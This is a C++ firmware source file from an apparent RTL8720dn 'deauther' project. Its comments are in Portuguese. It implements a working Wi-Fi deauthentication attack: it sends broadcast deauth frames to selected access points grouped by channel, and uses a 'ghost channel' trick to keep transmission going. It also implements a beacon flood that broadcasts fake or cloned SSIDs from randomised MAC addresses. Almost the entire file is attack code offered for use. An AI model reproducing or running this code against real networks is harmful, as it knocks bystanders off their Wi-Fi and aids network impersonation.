#line 1 "C:\\Users\\R4bb1t\\Downloads\\RTL870dn-r4bb1t-havoc-main\\RTL870dn-r4bb1t-havoc-main\\RTL8720dn-Deauther\\wifi_attacks.cpp"
// STL MUST come first
#undef max
#include <vector>

#include "wifi_attacks.h"

// ── Built-in SSID table ───────────────────────────────────
const char* BEACON_SSIDS[] = {
  "FBI Surveillance Van",
  "Loading... Please Wait",
  "Not Your WiFi",
  "Virus Detected!",
  "DEA Surveillance",
  "NSA MonitoringUnit4",
  "Skynet Global Defense",
  "Definitely Not NSA",
  "Pretty Fly for a WiFi",
  "The Internet",
  "Abraham Linksys",
  "Benjamin FrankLAN",
  "Bill Wi the Science Fi",
  "LAN Solo",
  "Tell My WiFi Love Her",
  "Wu-Tang LAN",
  "NETGEAR_EXT",
  "TP-Link_5G_EXT",
  "DIRECT-Roku-Player",
  "xfinitywifi",
  "ATT-WIFI-0001",
  "CLARO_FIBRA_5G",
  "VIVO-Fibra-EXT",
  "TIM_LIVE_2G",
  "HackerNet",
};

// ── Deauth state ──────────────────────────────────────────
ChannelGroup deauth_groups[MAX_CHANNELS];
int          deauth_group_count = 0;
int          current_group_idx  = 0;
uint32_t     sent_frames        = 0;
int          frames_per_deauth  = 1;  // 1 frame por burst — rate limiter em wifi_tx_raw_frame garante espacamento adequado
int          send_delay_ms      = 0;  // obsoleto, mantido por compatibilidade
bool         isDeauthing        = false;

// ── Beacon state ──────────────────────────────────────────
uint8_t      beacon_mac[6]         = {0xAA, 0xBB, 0xCC, 0x00, 0x00, 0x00};
uint8_t      broadcast_mac[6]      = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
int          beacon_ssid_idx       = 0;
uint32_t     beacon_frames         = 0;
bool         isBeaconing           = false;

BeaconMode   beacon_mode           = BEACON_MODE_RANDOM;
int          beacon_count          = 25;         // default: 25 SSIDs
char         beacon_custom_ssid[33]= "R4BB1T";   // default custom name

// ── get_beacon_ssid ───────────────────────────────────────
// SSID uniqueness strategy (safe, 802.11 max = 32 bytes):
//
//   RANDOM / CLONE: cycle through the pool of base SSIDs.
//     Each full cycle through the pool adds 1 NBSP pair (2 bytes) as suffix.
//     So idx=0..N-1 → pool[0..N-1] + no suffix
//        idx=N..2N-1 → pool[0..N-1] + 1 NBSP
//        idx=2N..3N-1 → pool[0..N-1] + 2 NBSP
//        ...capped when base+suffix would exceed 32 bytes.
//
//   CUSTOM: single base SSID. Each idx adds 1 NBSP pair as suffix,
//     capped at 32 bytes total.
//
// `out` must be at least 33 bytes.
void get_beacon_ssid(int idx, char* out, size_t outLen) {
  const char NBSP[2] = {(char)0xC2, (char)0xA0}; // UTF-8 Non-Breaking Space
  const int  SSID_MAX = 32; // 802.11 hard limit

  const char* base     = nullptr;
  char        cloneBase[33];
  int         poolSz   = 0;
  int         nbspCnt  = 0; // how many NBSP pairs to append

  switch (beacon_mode) {
    case BEACON_MODE_CUSTOM:
      base     = beacon_custom_ssid;
      poolSz   = 1;
      nbspCnt  = idx;          // 1 NBSP pair per idx
      break;

    case BEACON_MODE_CLONE: {
      int pool[MAX_SCAN_RESULTS];
      for (int i = 0; i < (int)scan_results.size(); i++)
        if (net_marked[i]) pool[poolSz++] = i;
      if (poolSz == 0)
        for (int i = 0; i < (int)scan_results.size(); i++) pool[poolSz++] = i;
      if (poolSz > 0) {
        int netIdx = pool[idx % poolSz];
        scan_results[netIdx].ssid.substring(0, 32).toCharArray(cloneBase, sizeof(cloneBase));
        base = cloneBase;
      } else {
        base   = "Network";
        poolSz = 1;
      }
      nbspCnt = idx / poolSz;   // 1 NBSP pair added per full cycle
      break;
    }

    default: // BEACON_MODE_RANDOM
      base    = BEACON_SSIDS[idx % NUM_BEACON_SSIDS];
      poolSz  = NUM_BEACON_SSIDS;
      nbspCnt = idx / NUM_BEACON_SSIDS; // 1 NBSP per full cycle through 25 SSIDs
      break;
  }

  // Copy base, capped at SSID_MAX
  size_t blen = strlen(base);
  if ((int)blen > SSID_MAX)   blen = SSID_MAX;
  if (blen >= outLen)         blen = outLen - 1;
  memcpy(out, base, blen);
  size_t pos = blen;

  // Append NBSP pairs — hard stop at SSID_MAX total
  for (int n = 0; n < nbspCnt; n++) {
    if ((int)(pos + 2) > SSID_MAX) break; // 802.11 limit
    if (pos + 2 >= outLen)         break; // buffer limit
    out[pos++] = NBSP[0];
    out[pos++] = NBSP[1];
  }
  out[pos] = '\0';
}

// ── Telemetry & Failure Counters ──────────────────────────
uint32_t deauth_fail_count  = 0;
uint32_t beacon_fail_count  = 0;
static uint32_t last_deauth_stat_ms = 0;
static uint32_t last_beacon_stat_ms = 0;

#ifdef __cplusplus
extern "C" {
#endif
size_t xPortGetFreeHeapSize(void);
size_t xPortGetMinimumEverFreeHeapSize(void);
#ifdef __cplusplus
}
#endif

void log_system_diagnostics(const char* context) {
  size_t free_heap = xPortGetFreeHeapSize();
  size_t min_heap  = xPortGetMinimumEverFreeHeapSize();
  uint8_t hw_ch    = 0;
  int ch_res       = wext_get_channel(WLAN0_NAME, &hw_ch);

  DEBUG_SER_PRINT("\n==================================================\n");
  DEBUG_SER_PRINT("[SYS-DIAG] Contexto: ");
  DEBUG_SER_PRINT(context);
  DEBUG_SER_PRINT("\n");
  DEBUG_SER_PRINT("  -> Heap Livre Atual   : ");
  DEBUG_SER_PRINT((uint32_t)free_heap);
  DEBUG_SER_PRINT(" bytes\n");
  DEBUG_SER_PRINT("  -> Heap Min Historico : ");
  DEBUG_SER_PRINT((uint32_t)min_heap);
  DEBUG_SER_PRINT(" bytes\n");
  DEBUG_SER_PRINT("  -> Canal HW Ativo     : ");
  DEBUG_SER_PRINT((int)hw_ch);
  if (ch_res != 0) {
    DEBUG_SER_PRINT(" (wext_get_channel err=");
    DEBUG_SER_PRINT(ch_res);
    DEBUG_SER_PRINT(")");
  }
  DEBUG_SER_PRINT("\n");
  DEBUG_SER_PRINT("  -> Uptime Sistema     : ");
  DEBUG_SER_PRINT(millis());
  DEBUG_SER_PRINT(" ms\n");
  DEBUG_SER_PRINT("  -> Ptr rltk_wlan_info : 0x");
  DEBUG_SER_PRINT((uint32_t)rltk_wlan_info, HEX);
  DEBUG_SER_PRINT("\n");
  DEBUG_SER_PRINT("==================================================\n");
}

// ── Deauth ────────────────────────────────────────────────
static int last_hw_deauth_channel = -1;

// Calcula canal fantasma sempre dentro do range 1-11 (seguro FCC/ANATEL).
// Se o alvo estiver nos canais baixos (1-5) usamos ch 11, senão ch 1.
// Isso garante que wext_set_channel nunca recebe um canal proibido.
static inline int ghost_channel_for(int target_ch) {
  return (target_ch <= 5) ? 11 : 1;
}

void start_deauth() {
  DEBUG_SER_PRINT("\n[DEAUTH] >>> INICIANDO ATAQUE DEAUTH <<<\n");
  reset_tx_telemetry();
  log_system_diagnostics("START_DEAUTH");

  deauth_group_count = 0;
  current_group_idx  = 0;
  last_hw_deauth_channel = -1;
  deauth_fail_count  = 0;
  last_deauth_stat_ms= millis();

  // Se nenhum alvo foi marcado, mas temos scan_results, usa o alvo atualmente selecionado
  bool any_marked = false;
  for (int i = 0; i < (int)scan_results.size(); i++) {
    if (net_marked[i]) { any_marked = true; break; }
  }
  if (!any_marked && !scan_results.empty() && net_sel < (int)scan_results.size()) {
    net_marked[net_sel] = true;
    DEBUG_SER_PRINT("[DEAUTH] Nenhum alvo estava marcado. Auto-selecionado indice ");
    DEBUG_SER_PRINT(net_sel);
    DEBUG_SER_PRINT(": '");
    DEBUG_SER_PRINT(scan_results[net_sel].ssid);
    DEBUG_SER_PRINT("'\n");
  }

  for (int i = 0; i < (int)scan_results.size(); i++) {
    if (net_marked[i]) {
      int ch = scan_results[i].channel;
      int g_idx = -1;
      for (int g = 0; g < deauth_group_count; g++) {
        if (deauth_groups[g].channel == ch) { g_idx = g; break; }
      }
      if (g_idx == -1 && deauth_group_count < MAX_CHANNELS) {
        g_idx = deauth_group_count++;
        deauth_groups[g_idx].channel = ch;
        deauth_groups[g_idx].count   = 0;
      }
      if (g_idx != -1 && deauth_groups[g_idx].count < MAX_SCAN_RESULTS) {
        deauth_groups[g_idx].targets[deauth_groups[g_idx].count++] = i;
      }
    }
  }

  DEBUG_SER_PRINT("[DEAUTH] Grupos por canal formados: ");
  DEBUG_SER_PRINT(deauth_group_count);
  DEBUG_SER_PRINT("\n");

  // ── Grupo fantasma para single-canal ────────────────────────────────────────
  // Com apenas 1 grupo (1 rede, ou N redes no mesmo canal), o TX ring
  // do RTL8720 satura em ~33 frames porque nunca há troca de canal.
  // Solução: inserir um segundo grupo em canal diferente com 0 alvos.
  // O código multi-canal existente alterna automaticamente:
  //   ciclo par   → real_ch  → envia frames normalmente
  //   ciclo ímpar → ghost_ch → wext_set_channel (sem TX, count=0)
  // Espelha EXATAMENTE o comportamento de 2 redes em canais distintos:
  //   1 wext_set_channel por chamada, com 70ms de gap entre elas.
  if (deauth_group_count == 1 && deauth_group_count < MAX_CHANNELS) {
    int ghost_ch = ghost_channel_for(deauth_groups[0].channel);
    deauth_groups[1].channel = ghost_ch;
    deauth_groups[1].count   = 0;  // 0 alvos = sem TX no canal fantasma
    deauth_group_count       = 2;
    DEBUG_SER_PRINT("[DEAUTH] Canal unico detectado. Ghost group adicionado: ch=");
    DEBUG_SER_PRINT(ghost_ch);
    DEBUG_SER_PRINT(" (0 alvos - apenas troca de canal para drenar TX ring)\n");
  }

  for (int g = 0; g < deauth_group_count; g++) {
    DEBUG_SER_PRINT("  [Grupo ");
    DEBUG_SER_PRINT(g);
    DEBUG_SER_PRINT("] Canal ");
    DEBUG_SER_PRINT(deauth_groups[g].channel);
    DEBUG_SER_PRINT(" - Total Alvos: ");
    DEBUG_SER_PRINT(deauth_groups[g].count);
    DEBUG_SER_PRINT("\n");
    for (int t = 0; t < deauth_groups[g].count; t++) {
      int idx = deauth_groups[g].targets[t];
      DEBUG_SER_PRINT("    -> Alvo ");
      DEBUG_SER_PRINT(t);
      DEBUG_SER_PRINT(": SSID='");
      DEBUG_SER_PRINT(scan_results[idx].ssid);
      DEBUG_SER_PRINT("' BSSID=");
      DEBUG_SER_PRINT(scan_results[idx].bssid_str);
      DEBUG_SER_PRINT(" Ch=");
      DEBUG_SER_PRINT((int)scan_results[idx].channel);
      DEBUG_SER_PRINT(" RSSI=");
      DEBUG_SER_PRINT(scan_results[idx].rssi);
      DEBUG_SER_PRINT(" dBm\n");
    }
  }

  if (deauth_group_count > 0) {
    isDeauthing       = true;
    sent_frames       = 0;
    current_group_idx = 0;
    DEBUG_SER_PRINT("[DEAUTH] Ataque ativo com sucesso!\n");
  } else {
    DEBUG_SER_PRINT("[DEAUTH-WARN] Nenhum alvo configurado. Ataque nao iniciado.\n");
  }
}

void stop_deauth() {
  DEBUG_SER_PRINT("\n[DEAUTH] >>> PARANDO ATAQUE DEAUTH <<<\n");
  DEBUG_SER_PRINT("[DEAUTH] Total frames enviados: ");
  DEBUG_SER_PRINT(sent_frames);
  DEBUG_SER_PRINT(" | Falhas: ");
  DEBUG_SER_PRINT(deauth_fail_count);
  DEBUG_SER_PRINT("\n");
  log_system_diagnostics("STOP_DEAUTH");

  isDeauthing        = false;
  deauth_group_count = 0;
  current_group_idx  = 0;
  last_hw_deauth_channel = -1;
  deauth_fail_count  = 0;
}

void run_deauth_frame() {
  if (!isDeauthing || deauth_group_count == 0) return;

  ChannelGroup &g = deauth_groups[current_group_idx % deauth_group_count];

  // Troca de canal no início do ciclo, somente quando muda.
  // Com o ghost group, esta troca acontece a cada 2 ciclos, separada pelo
  // gap de 70ms do loop — idêntico ao comportamento de 2 redes em canais distintos.
  if (last_hw_deauth_channel != g.channel) {
    int ch_ret = wext_set_channel(WLAN0_NAME, g.channel);
    uint8_t verified_ch = 0;
    wext_get_channel(WLAN0_NAME, &verified_ch);
    if (ch_ret != 0 || verified_ch != g.channel) {
      DEBUG_SER_PRINT("[DEAUTH-HW-ERR] Falha mudanca canal ");
      DEBUG_SER_PRINT(g.channel);
      DEBUG_SER_PRINT(" (wext ret=");
      DEBUG_SER_PRINT(ch_ret);
      DEBUG_SER_PRINT(", hw_ch=");
      DEBUG_SER_PRINT((int)verified_ch);
      DEBUG_SER_PRINT(")\n");
    }
    last_hw_deauth_channel = g.channel;
    delay(15);
  }

  // Envia frames por alvo com respiração
  for (int t = 0; t < g.count; t++) {
    int idx = g.targets[t];
    if (idx < (int)scan_results.size()) {
      uint8_t bssid_copy[6];
      memcpy(bssid_copy, scan_results[idx].bssid, 6);
      int tx_res = wifi_tx_deauth_frame(bssid_copy, (void*)"\xFF\xFF\xFF\xFF\xFF\xFF", 2);
      if (tx_res == TX_SUCCESS) {
        sent_frames++;
      } else {
        deauth_fail_count++;
        DEBUG_SER_PRINT("[DEAUTH-FAIL] Cod=");
        DEBUG_SER_PRINT(tx_res);
        DEBUG_SER_PRINT(" (");
        DEBUG_SER_PRINT(tx_status_str(tx_res));
        DEBUG_SER_PRINT(") dump_ret=");
        DEBUG_SER_PRINT(tx_telemetry.last_dump_ret);
        DEBUG_SER_PRINT(" Ch=");
        DEBUG_SER_PRINT(g.channel);
        DEBUG_SER_PRINT(" Tgt='");
        DEBUG_SER_PRINT(scan_results[idx].ssid);
        DEBUG_SER_PRINT("' BSSID=");
        DEBUG_SER_PRINT(scan_results[idx].bssid_str);
        DEBUG_SER_PRINT(" Heap=");
        DEBUG_SER_PRINT((uint32_t)xPortGetFreeHeapSize());
        DEBUG_SER_PRINT(" B\n");

        if (tx_res == TX_ERR_ALLOC_FRAME) {
          delay(6);
        }
      }
      delay(10);
      yield();
    }
  }
  yield();

  // Pausa uniforme pós-ciclo
  delay(8);

  current_group_idx = (current_group_idx + 1) % deauth_group_count;

  // Telemetria periodica a cada 2000ms
  if (millis() - last_deauth_stat_ms >= 2000) {
    last_deauth_stat_ms = millis();
    DEBUG_SER_PRINT("[DEAUTH-STAT] Enviados=");
    DEBUG_SER_PRINT(sent_frames);
    DEBUG_SER_PRINT(" | Falhas=");
    DEBUG_SER_PRINT(deauth_fail_count);
    DEBUG_SER_PRINT(" (AllocFail=");
    DEBUG_SER_PRINT(tx_telemetry.tx_alloc_failures);
    DEBUG_SER_PRINT(", DumpFail=");
    DEBUG_SER_PRINT(tx_telemetry.tx_dump_failures);
    DEBUG_SER_PRINT(") | Heap=");
    DEBUG_SER_PRINT((uint32_t)xPortGetFreeHeapSize());
    DEBUG_SER_PRINT(" B (Min=");
    DEBUG_SER_PRINT((uint32_t)xPortGetMinimumEverFreeHeapSize());
    DEBUG_SER_PRINT(" B) | Canal=");
    DEBUG_SER_PRINT(g.channel);
    DEBUG_SER_PRINT("\n");
  }
}

// ── Beacon ────────────────────────────────────────────────
void start_beacon() {
  DEBUG_SER_PRINT("\n[BEACON] >>> INICIANDO BEACON FLOOD <<<\n");
  reset_tx_telemetry();
  log_system_diagnostics("START_BEACON");

  int ch_res = wext_set_channel(WLAN0_NAME, 1);
  uint8_t verified_ch = 0;
  wext_get_channel(WLAN0_NAME, &verified_ch);
  DEBUG_SER_PRINT("[BEACON] Canal configurado: 1 -> wext_res=");
  DEBUG_SER_PRINT(ch_res);
  DEBUG_SER_PRINT(" (hw_ch=");
  DEBUG_SER_PRINT((int)verified_ch);
  DEBUG_SER_PRINT(")\n");
  delay(5);

  const char* mode_str = (beacon_mode == BEACON_MODE_RANDOM) ? "RANDOM" :
                         (beacon_mode == BEACON_MODE_CLONE)  ? "CLONE" : "CUSTOM";
  DEBUG_SER_PRINT("[BEACON] Modo: ");
  DEBUG_SER_PRINT(mode_str);
  DEBUG_SER_PRINT(" | Qtd SSIDs: ");
  DEBUG_SER_PRINT(beacon_count);
  if (beacon_mode == BEACON_MODE_CUSTOM) {
    DEBUG_SER_PRINT(" | Nome Custom: '");
    DEBUG_SER_PRINT(beacon_custom_ssid);
    DEBUG_SER_PRINT("'");
  }
  DEBUG_SER_PRINT("\n");

  isBeaconing        = true;
  beacon_frames      = 0;
  beacon_ssid_idx    = 0;
  beacon_fail_count  = 0;
  last_beacon_stat_ms= millis();
}

void stop_beacon() {
  DEBUG_SER_PRINT("\n[BEACON] >>> PARANDO BEACON FLOOD <<<\n");
  DEBUG_SER_PRINT("[BEACON] Total beacons enviados: ");
  DEBUG_SER_PRINT(beacon_frames);
  DEBUG_SER_PRINT(" | Falhas: ");
  DEBUG_SER_PRINT(beacon_fail_count);
  DEBUG_SER_PRINT("\n");
  log_system_diagnostics("STOP_BEACON");

  isBeaconing        = false;
  beacon_fail_count  = 0;
}

void run_beacon_frame() {
  if (!isBeaconing) return;

  // Randomize last 3 bytes of MAC for each frame
  for (int i = 3; i < 6; i++) beacon_mac[i] = random(0, 256);

  // Build unique SSID for current index (max 36 bytes: 32 base + idx*2 NBSP)
  char ssidBuf[64];
  int safe_count = (beacon_count > 0) ? beacon_count : 25;
  get_beacon_ssid(beacon_ssid_idx % safe_count, ssidBuf, sizeof(ssidBuf));

  // yield antes de injetar: garante que o scheduler RTOS possa rodar antes do envio
  yield();
  int tx_res = wifi_tx_beacon_frame(beacon_mac, broadcast_mac, ssidBuf);
  if (tx_res == TX_SUCCESS) {
    beacon_frames++;
  } else {
    beacon_fail_count++;
    DEBUG_SER_PRINT("[BEACON-FAIL] Cod=");
    DEBUG_SER_PRINT(tx_res);
    DEBUG_SER_PRINT(" (");
    DEBUG_SER_PRINT(tx_status_str(tx_res));
    DEBUG_SER_PRINT(") dump_ret=");
    DEBUG_SER_PRINT(tx_telemetry.last_dump_ret);
    DEBUG_SER_PRINT(" SSID='");
    DEBUG_SER_PRINT(ssidBuf);
    DEBUG_SER_PRINT("' Heap=");
    DEBUG_SER_PRINT((uint32_t)xPortGetFreeHeapSize());
    DEBUG_SER_PRINT(" B\n");

    if (tx_res == TX_ERR_ALLOC_FRAME) {
      delay(6);
    }
  }

  // Pausa curta apos o envio permite ao driver liberar o TX descriptor.
  delay(10);
  yield();

  // Advance through beacon_count SSIDs (wrapping)
  beacon_ssid_idx = (beacon_ssid_idx + 1) % safe_count;

  // Telemetria periodica a cada 2000ms
  if (millis() - last_beacon_stat_ms >= 2000) {
    last_beacon_stat_ms = millis();
    DEBUG_SER_PRINT("[BEACON-STAT] Beacons=");
    DEBUG_SER_PRINT(beacon_frames);
    DEBUG_SER_PRINT(" | Falhas=");
    DEBUG_SER_PRINT(beacon_fail_count);
    DEBUG_SER_PRINT(" (AllocFail=");
    DEBUG_SER_PRINT(tx_telemetry.tx_alloc_failures);
    DEBUG_SER_PRINT(", DumpFail=");
    DEBUG_SER_PRINT(tx_telemetry.tx_dump_failures);
    DEBUG_SER_PRINT(") | Heap=");
    DEBUG_SER_PRINT((uint32_t)xPortGetFreeHeapSize());
    DEBUG_SER_PRINT(" B (Min=");
    DEBUG_SER_PRINT((uint32_t)xPortGetMinimumEverFreeHeapSize());
    DEBUG_SER_PRINT(" B) | Ultimo SSID='");
    DEBUG_SER_PRINT(ssidBuf);
    DEBUG_SER_PRINT("'\n");
  }
}